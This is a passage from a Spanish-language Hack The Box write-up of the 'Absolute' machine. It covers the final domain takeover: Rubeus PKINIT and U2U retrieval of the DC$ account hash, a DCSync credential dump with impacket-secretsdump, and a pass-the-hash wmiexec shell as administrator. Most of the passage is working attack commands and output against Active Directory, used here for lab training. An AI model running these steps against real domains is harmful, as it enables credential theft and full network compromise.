MJRJkBMZlP0Qf4n5BKcqLe/DFa9R66nA/JgH4awhx1WDc8TwqafHObBt9adK8nkN0R80WcE4Hy+nS1Gu1WR95F96YmNAut9+/ARNvgT7OIof5uETsa9y0gyzoPkqdMethcBSwbrRK5rhd3PXixm5jOxMESFErMyoNIMQ3Aj2tpPGB0jveLrBNYuesTsAVJK3G28kcFRccvjS//rTW7ZYukNh2G6TBSYEag+VCN9Ekgme1rXzlEDAEFoJ8bh8TfE214EFZ9q8Q4pfYM9vQW325RBHDaJb40ShUKezBjdbzqhUsL0oZ0m4F67QD8I80mOrbogy6f0RqSJej37k1DjYejaLphFUXHLtTLS1/Z+sCBwVsbZdU9apV9ya4BS9TqwPIQoVoTebZSN2x16sPR2z/nieH1PGfMDJe0W7p6ylF1vxGnb6kfweVeFlzUu77sxfKaxYcDBM0ZGgAuXk21L3mgHwZcKsNWu8yunRlLvrtkHNO4wUZhOY6ujFVxVZAabN/UWOZHwKW/oWuzxmkmSmI94BVIT0v8wKF5WxX0qpcVxzWCMEaS75SnVrXii1akSRlYILNjC4gk8KO/H8mMBXtAtdTk1/4gFm/OIa4DPoAZzCU0vjH5zNDFPnN4+2GvtdF5plrHMyHFEH/IOWZAhorqOHD3L6RB3nPwhEgeDnjuy5SGy9d3v9Ivrcy5UT50TQlpri4PEQ1zpi75Zx9EkLAbksbhizhG0SE8Id/5ZnPNGsQY4oC01bOrNhFpSICpJBNgo/iVGtdjA7MB8wBwYFKw4DAhoEFG/oKPs9FMhYZMaThJj2oInFrMaFBBT+AK8sfBvjVNePo9Epskfds/P2WwICB9A= /password:'xL8=jH0/bQ3@' /getcredentials /show /nowrap /domain:absolute.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN="CN=DC", OU=Domain Controllers, DC=absolute, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\DC$'
[*] Using domain controller: 10.129.142.54:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/absolute.htb
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  DC$
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  09/11/2023 17:41:28
  EndTime                  :  10/11/2023 3:41:28
  RenewTill                :  16/11/2023 17:41:28
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  M7L7gv/zz5xzthM7VzufIw==
  ASREP (key)              :  E6F2D6246EAB85BF294F3043757EE442

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A7864AB463177ACB9AEC553F18F42577
```

Vemos que nos devuelve las credenciales de la cuenta creada `DC$`, si las comprobamos por crackmapexec vemos que son válidas, y que no hace falta autenticarse por Kerberos para comprobarlo.

```bash
❯ cme smb 10.129.142.54 -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577
SMB         10.129.142.54   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.142.54   445    DC               [+] absolute.htb\DC$:A7864AB463177ACB9AEC553F18F42577 
```
{: .nolineno }

Ahora podemos realizar un DCSync para obtener el NTDS, ya que en esta nueva cuenta su podemos usar NTLM como método de autenticación, por lo que el `Pass-the-hash` funciona.

```bash
❯ impacket-secretsdump 'absolute.htb/DC$@10.129.142.54' -hashes :A7864AB463177ACB9AEC553F18F42577
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator\Administrator:500:aad3b435b51404eeaad3b435b51404ee:1f4a6093623653f6488d5aa24c75f2ea:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3ca378b063b18294fa5122c66c2280d4:::
J.Roberts:1103:aad3b435b51404eeaad3b435b51404ee:7d6b7511772593b6d0a3d2de4630025a:::
M.Chaffrey:1104:aad3b435b51404eeaad3b435b51404ee:13a699bfad06afb35fa0856f69632184:::
D.Klay:1105:aad3b435b51404eeaad3b435b51404ee:21c95f594a80bf53afc78114f98fd3ab:::
s.osvald:1106:aad3b435b51404eeaad3b435b51404ee:ab14438de333bf5a5283004f660879ee:::
j.robinson:1107:aad3b435b51404eeaad3b435b51404ee:0c8cb4f338183e9e67bbc98231a8e59f:::
n.smith:1108:aad3b435b51404eeaad3b435b51404ee:ef424db18e1ae6ba889fb12e8277797d:::
m.lovegod:1109:aad3b435b51404eeaad3b435b51404ee:a22f2835442b3c4cbf5f24855d5e5c3d:::
l.moore:1110:aad3b435b51404eeaad3b435b51404ee:0d4c6dccbfacbff5f8b4b31f57c528ba:::
c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::
s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::
d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::
svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::
svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::
winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::
............
............
```
{: .nolineno }

Con `wmiexec` nos conectamos al DC, usando el hash del usuario `administrator`.

```bash
❯ impacket-wmiexec 'absolute.htb/administrator@10.129.142.54' -hashes :1f4a6093623653f6488d5aa24c75f2ea
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
absolute\administrator

C:\>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 3:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::1f6
   IPv6 Address. . . . . . . . . . . : dead:beef::9126:7509:a487:d66e
   Link-local IPv6 Address . . . . . : fe80::9126:7509:a487:d66e%11
   IPv4 Address. . . . . . . . . . . : 10.129.142.54
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
                                       10.129.0.1

------
C:\users\Administrator\desktop>type root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXX

C:\users\Administrator\desktop>
```
{: .nolineno }

De esta manera habríamos concluido la máquina.
